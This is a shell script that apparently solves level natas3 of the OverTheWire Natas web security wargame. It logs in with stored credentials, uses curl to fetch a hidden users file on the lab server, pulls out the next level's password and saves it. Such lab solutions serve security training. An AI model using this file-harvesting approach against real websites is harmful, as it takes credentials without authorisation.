#!/bin/sh

level="natas3"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth -sL $url/s3cr3t/users.txt 2>&1 | cut -d ":" -f 2)
echo -n "[+] Password for the next level: $next_password\n"
echo "natas4:$next_password" >> ./credentials
